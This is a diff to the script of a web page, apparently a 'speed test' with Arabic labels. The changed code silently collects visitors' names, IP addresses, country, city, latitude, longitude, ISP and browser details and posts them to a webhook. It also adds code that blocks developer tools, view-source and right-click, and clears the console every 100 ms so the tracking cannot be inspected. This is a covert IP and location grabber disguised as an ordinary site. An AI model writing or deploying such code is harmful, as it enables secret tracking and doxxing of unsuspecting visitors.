@@ -256,41 +256,88 @@
       const timeString = now.toISOString();
 
       const ipv4 = ipv4Data.ip;
-      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : "لا يوجد";
-      const region = geoData.region || "Unknown";
-      const city = geoData.city || "Unknown";
+      const ipv6 = (ipv6Data.ip && ipv6Data.ip !== ipv4) ? ipv6Data.ip : 'غير معروف';
 
-      const data = {
-        content: null,
-        embeds: [{
-          title: `مستخدم جديد: ${name}`,
-          color: 5814783,
-          fields: [
-            { name: "الاسم", value: name, inline: true },
-            { name: "IPv4", value: ipv4, inline: true },
-            { name: "IPv6", value: ipv6, inline: true },
-            { name: "المتصفح", value: ua, inline: false },
-            { name: "اللغة", value: lang, inline: true },
-            { name: "المنطقة", value: region, inline: true },
-            { name: "المدينة", value: city, inline: true },
-            { name: "الوقت", value: timeString, inline: false }
-          ],
-          footer: { text: "اختبر سرعتك + حماية" }
-        }]
-      };
+      function sendToWebhook(extraGeo = '') {
+        const infoText = `
+الاسم: ${name}
+IP (IPv4): ${ipv4}
+IP (IPv6): ${ipv6}
+الدولة: ${geoData.country_name}
+المنطقة: ${geoData.region}
+المدينة: ${geoData.city}
+خط العرض: ${geoData.latitude}
+خط الطول: ${geoData.longitude}
+المنظمة: ${geoData.org}
+المنطقة الزمنية: ${geoData.timezone}
+متصفح المستخدم: ${ua}
+اللغة: ${lang}
+الوقت: ${timeString}
+${extraGeo}
+        `.trim();
 
-      await fetch(WEBHOOK_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      });
+        fetch(WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: infoText }),
+        });
+      }
+
+      sendToWebhook();
+
     } catch (e) {
-      console.error("فشل إرسال البيانات:", e);
+      // ما نعمل شيء لو فشل الإرسال
     }
   }
-</script>
 
-<script src="protect.js"></script>
+  // ============== حماية قوية مدمجة ===============
+  // منع فتح أدوات المطور
+  document.addEventListener('keydown', function (e) {
+    if (
+      e.key === "F12" ||
+      (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
+      (e.ctrlKey && e.key === "U") ||
+      (e.ctrlKey && e.key === "S")
+    ) {
+      e.preventDefault();
+      alert("هذا الموقع محمي ضد الاختراق!");
+      return false;
+    }
+  });
+
+  // منع فتح القائمة بالزر الأيمن للفأرة
+  document.addEventListener('contextmenu', function (e) {
+    e.preventDefault();
+    alert("الزر الأيمن معطل للحماية");
+    return false;
+  });
+
+  // مسح console باستمرار لمنع فحص الكود
+  (function clearConsoleLoop() {
+    console.clear();
+    setTimeout(clearConsoleLoop, 100);
+  })();
+
+  // محاولة اكتشاف أدوات المطور (Console) بشكل دوري
+  (function detectDevTools() {
+    let devtools = false;
+    const threshold = 160;
+    setInterval(() => {
+      const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+      const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+      if (widthThreshold || heightThreshold) {
+        if (!devtools) {
+          devtools = true;
+          alert("يرجى عدم فتح أدوات المطور، الموقع محمي!");
+          window.location.reload();
+        }
+      } else {
+        devtools = false;
+      }
+    }, 1000);
+  })();
+
+</script>
 
 </body>
 </html>
